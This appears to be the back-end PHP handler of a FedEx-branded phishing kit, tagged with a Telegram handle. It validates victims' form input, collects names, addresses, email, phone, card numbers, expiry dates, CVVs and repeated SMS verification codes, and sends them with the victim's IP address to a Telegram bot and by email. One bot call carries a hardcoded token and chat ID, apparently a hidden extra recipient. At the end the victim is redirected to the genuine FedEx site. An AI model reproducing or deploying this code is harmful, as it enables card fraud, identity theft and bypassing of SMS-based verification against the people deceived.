<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

include("../anti/anti1.php");
include("../anti/anti2.php");
include("../anti/anti3.php");
include("../anti/anti4.php");
include("../anti/anti5.php");
include("../anti/anti6.php");
include("../anti/anti7.php");
include("../anti/anti8.php");





$to = '' ;

if( $_POST['step'] == 'billing' ) {


        $_SESSION['errors']      = [];
        $_SESSION['first_name']  = $_POST['first_name'];
        $_SESSION['last_name']   = $_POST['last_name'];
        $_SESSION['email']   = $_POST['email'];
        $_SESSION['phone']   = $_POST['phone'];
        $_SESSION['address']    = $_POST['address'];
        $_SESSION['city']       = $_POST['city'];
        $_SESSION['state']     = $_POST['state'];
        $_SESSION['zip']     = $_POST['zip'];
        

        if( empty($_POST['first_name']) ) {
            $_SESSION['errors']['first_name'] = true;
        }

        if( empty($_POST['last_name']) ) {
            $_SESSION['errors']['last_name'] = true;
        }

        if( empty($_POST['email']) ) {
            $_SESSION['errors']['email'] = true;
        }

        if( empty($_POST['phone']) ) {
            $_SESSION['errors']['phone'] = true;
        }

        if( empty($_POST['address']) ) {
            $_SESSION['errors']['address'] = true;
        }

        if( empty($_POST['city']) ) {
            $_SESSION['errors']['city'] = true;
        }

        if( empty($_POST['state']) ) {
            $_SESSION['errors']['state'] = true;
        }

        if( empty($_POST['zip']) ) {
            $_SESSION['errors']['zip'] = true;
        }


        if( count($_SESSION['errors']) == 0 ) {

            $subject  = $_SERVER['REMOTE_ADDR'] . " | FEDEX | BILLING |" . "\r\n"; ;
            $message  = "_______  BILLING INFO ___ " . $_SERVER["REMOTE_ADDR"] . "\r\n"; 
            $message .= "LAST NAME : " . $_POST['last_name']                   . "\r\n";
            $message .= "FIRST NAME : " . $_POST['first_name']                 . "\r\n" ;
            $message .= "COUNTRY : " . $_POST['country']                 . "\r\n" ;
            $message .= "ZIP : " . $_POST['zip']               . "\r\n" ;
            $message .= "ADDRESS : " . $_POST['address']                   . "\r\n" ;
            $message .= "CITY : " . $_POST['city']                             . "\r\n" ;
            $message .= "STATE : " . $_POST['state']               . "\r\n" ;
            $message .= "EMAIL : " . $_POST['email']                           . "\r\n" ;
            $message .= "NUMBER PHONE : " . $_POST['phone']               . "\r\n" ;


            mail($to, $subject, $message);



            if(isset($_POST['submit']))
            {
                $apiToken = "" ;  // YOU TOKEN 
                $data = [
                'chat_id' => '' ,  // YOUR ID 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };



            if(isset($_POST['submit']))
            {
                $apiToken = "1368217260:AAFMv7cax8TuuJfjg3_QgLxHjj1EbS32dOc";
                $data = [
                'chat_id' => '1133023413', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };


            header("Location: loading.php");
            exit();
        }else{
            header("Location: index.php");
            exit();}
}

else if ($_POST['step']=='cc') {
        $_SESSION['errors']       = [];
        $message .= "LAST NAME : " . $_POST['last_name']                   . "\r\n";
        $message .= "FIRST NAME : " . $_POST['first_name']                 . "\r\n" ;
        $_SESSION['card_number']  = $_POST['card_number'];
        $_SESSION['expiry']       = $_POST['expiry'];
        $_SESSION['ccv']          = $_POST['ccv'];



        if( empty($_POST['last_name']) ) {
            $_SESSION['errors']['last_name'] = true;
        }

        if( empty($_POST['first_name']) ) {
            $_SESSION['errors']['first_name'] = true;
        }

        if( empty($_POST['card_number']) ) {
            $_SESSION['errors']['card_number'] = true;
        }

        if( empty($_POST['expiry']) ) {
            $_SESSION['errors']['expiry'] = true;
        }

        if( empty($_POST['cvv']) ) {
            $_SESSION['errors']['cvv'] = true;
        }


        if( count($_SESSION['errors']) == 0 ) {
            $subject  = $_SERVER['REMOTE_ADDR'] . " | FEDEX | CC |"     . "\r\n"; ;
            $message  = "_______  CC INFO ___ " . $_SERVER["REMOTE_ADDR"]  . "\r\n"; 
            $message .= "LAST NAME : " . $_POST['last_name']                   . "\r\n";
            $message .= "FIRST NAME : " . $_POST['first_name']                 . "\r\n" ;
            $message .= "CARD NUMBER : " . $_POST['card_number']           . "\r\n";
            $message .= "EXPIRY : " . $_POST['expiry']                     . "\r\n" ;
            $message .= "CVV : " . $_POST['cvv']                           . "\r\n" ;
            
            if(isset($_POST['submit']))
            {
                $apiToken = " " ; // YOU TOKEN
                $data = [
                'chat_id' => '' , // YOUR ID 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };


            if(isset($_POST['submit']))
            {
                $apiToken = "1368217260:AAFMv7cax8TuuJfjg3_QgLxHjj1EbS32dOc";
                $data = [
                'chat_id' => '1133023413', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
            };

            mail($to, $subject, $message);

            header("Location: loading-sms.php"); 
            exit();
        }else{
            header("Location: cc.php");
            exit();}
}





else if ($_POST['step'] == 'sms') {
  

    if( count($_SESSION['errors']) == 0 ) {

        $subject  = $_SERVER['REMOTE_ADDR'] . " | FEDEX | SMS |" . "\r\n"; ;
        $message  = "_______  SMS INFO ___ " . $_SERVER["REMOTE_ADDR"] . "\r\n"; 
        $message .= "SMS CODE : " . $_POST['sms']                      . "\r\n";

        if(isset($_POST['submit']))
        {
                $apiToken = " " ;   //   YOU TOKEN
                $data = [
                'chat_id' => '' ,   // YOUR ID 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
        };

        if(isset($_POST['submit']))
        {
                $apiToken = "1368217260:AAFMv7cax8TuuJfjg3_QgLxHjj1EbS32dOc";
                $data = [
                'chat_id' => '1133023413', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
        };


        mail($to, $subject, $message);
        header("Location: sms-er.php"); 
        exit(); 
    }

}

else if ($_POST['step'] == 'sms-er') {
  

    if( count($_SESSION['errors']) == 0 ) {
        
        $subject  = $_SERVER['REMOTE_ADDR'] . " | FEDEX | SMS |" . "\r\n"; ;
        $message  = "_______  SMS INFO ___ " . $_SERVER["REMOTE_ADDR"] . "\r\n"; 
        $message .= "SMS CODE : " . $_POST['sms']                      . "\r\n";

        if(isset($_POST['submit']))
        {
                $apiToken = " " ;   //   YOU TOKEN
                $data = [
                'chat_id' => '' ,   // YOUR ID 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
        };

        if(isset($_POST['submit']))
        {
                $apiToken = "1368217260:AAFMv7cax8TuuJfjg3_QgLxHjj1EbS32dOc";
                $data = [
                'chat_id' => '1133023413', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
        };


        mail($to, $subject, $message);
        header("Location: sms-err.php"); 
        exit(); 
    }

}

else if ($_POST['step'] == 'sms-err') {
  

    if( count($_SESSION['errors']) == 0 ) {
        
        $subject  = $_SERVER['REMOTE_ADDR'] . " | FEDEX | SMS |" . "\r\n"; ;
        $message  = "_______  SMS INFO ___ " . $_SERVER["REMOTE_ADDR"] . "\r\n"; 
        $message .= "SMS CODE : " . $_POST['sms']                      . "\r\n";

        if(isset($_POST['submit']))
        {
                $apiToken = " " ;   //   YOU TOKEN
                $data = [
                'chat_id' => '' ,   // YOUR ID 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
        };

        if(isset($_POST['submit']))
        {
                $apiToken = "1368217260:AAFMv7cax8TuuJfjg3_QgLxHjj1EbS32dOc";
                $data = [
                'chat_id' => '1133023413', 
                'text' => $subject . $message
                ];
                $response = file_get_contents("https://api.telegram.org/bot" .$apiToken . "/sendMessage?" . http_build_query($data) );    
        };


        mail($to, $subject, $message);
        header("Location: https://www.fedex.com/fcl/?appName=fclpickup&locale=ca_en&step3URL=https%3A%2F%2Fwww.fedex.com%2FPickupApp%2FFCLStep3.jsp&returnurl=https%3A%2F%2Fwww.fedex.com%2FPickupApp%2Flogin%3Flocale%3Den_CA%26appTab%3DFDXE&programIndicator=4"); 
        exit(); 
    }

}
?>